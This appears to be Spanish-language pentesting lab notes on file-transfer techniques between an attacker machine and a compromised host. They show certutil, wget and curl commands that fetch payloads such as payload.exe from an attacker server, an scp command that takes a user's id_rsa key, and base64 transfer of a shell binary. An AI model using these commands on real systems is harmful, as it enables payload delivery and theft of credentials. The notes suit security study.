# From Linux to Windows

1. Creamos un servidor simple con python en la ruta donde est√© el fichero que queremos compartir: `python -m http.serve 80`
2. En la m√°quina comprometida windows, usamos el siguiente comando para hacer una petici√≥n:
		
	![[Pasted image 20250210011041.png]]
`certutil -urlcache -f http://ip/payload.exe payload.exe`

# From Linux to Linux

1. Creamos servidor simple con python.
	`python -m http.serve 80`
2. Hacemos una petici√≥n desde la m√°quina v√≠ctima:
	2.1 wget http://ip-atacante/file.txt
	2.2 curl -X GET http://



NOTA : Con Python version<3 usar :
python -m SimpleHTTPServer 8000

## Transfer files via SSH
#### Transferir a la m√°quina atacante
`
`scp <user>@<ip>:<path_to_file> <path where store file>`
Example:
`scp student@10.10.10.1:~/.ssh/id_rsa .` -> Esto descarga en el directorio actual la id_rsa del home del usuario student.
``
#### Transferir a maquina victima
```bash
scp -P [puerto] [archivo_local_a_transferir] [usuario]@[host]:[ruta_remota_destino]
```

Ejemplo:

```bash
scp -P 39714 [archivo_local_a_transferir] user1@83.136.253.59:/tmp/[nombre_en_destino]
```

### **3Ô∏è‚É£ Transferir directorios completos**

Para copiar una carpeta y todo su contenido, a√±ade la opci√≥n `-r` (**recursivo**):

**Desde la v√≠ctima hacia la atacante:**

bash

`scp -r [usuario]@[ip_remota]:[ruta_directorio_remoto] [ruta_local_destino]`

Ejemplo:

bash

`scp -r student@10.10.10.1:/var/www/html .`

**Desde la atacante hacia la v√≠ctima:**

bash

`scp -P [puerto] -r [directorio_local] [usuario]@[ip_remota]:[ruta_remota_destino]`

Ejemplo:

bash

`scp -P 39714 -r tools user1@83.136.253.59:/opt/tools`

## 3Ô∏è‚É£ Usando `base64` (cuando hay restricciones de red/firewall)

Este m√©todo es ideal para **ficheros binarios o scripts** cuando no es posible usar `wget`, `curl` o `scp`.

**En la m√°quina atacante (codificar en base64):**
```bash
base64 archivo -w 0
```
üìå `-w 0` evita saltos de l√≠nea.

**Uso del portapapeles:**  
- Copia el texto resultante (string base64) al portapapeles.  
- P√©galo en la sesi√≥n de shell de la m√°quina v√≠ctima dentro de un comando `echo` para reconstruir el archivo.

**En la m√°quina v√≠ctima (decodificar):**
```bash
echo "cadena_base64" | base64 -d > archivo
chmod +x archivo
```

**Ejemplo completo con binario `shell`:**
```bash
# Atacante
base64 shell -w 0 > shell.b64

# Copiar contenido de shell.b64 al portapapeles y pegar en la v√≠ctima:

# V√≠ctima
echo "AQU√ç_TU_CADENA_BASE64" | base64 -d > shell
chmod +x shell
```

üí° Si el archivo es muy grande, considera partirlo en varias partes antes de codificarlo.

---

## 4Ô∏è‚É£ Validar la transferencia

**Comprobar el tipo de archivo:**
```bash
file archivo
```

**Verificar integridad con hash:**
```bash
# Atacante
md5sum archivo

# V√≠ctima
md5sum archivo
```
Si el hash coincide, la transferencia fue correcta.

---

## üìå Resumen r√°pido

| M√©todo      | Requisitos | Direcci√≥n | Pros | Contras |
|-------------|------------|-----------|------|---------|
| `wget`/`curl` | Puerto abierto, HTTP server | Atacante ‚Üí V√≠ctima | F√°cil, r√°pido | V√≠ctima debe tener wget o curl |
| `scp`       | Credenciales SSH | Bidireccional | Seguro, cifrado | Requiere SSH abierto |
| `base64`    | Ninguno (solo shell) | Bidireccional | Funciona con binarios y sin red directa | Lento, requiere copy/paste grande |

	


		
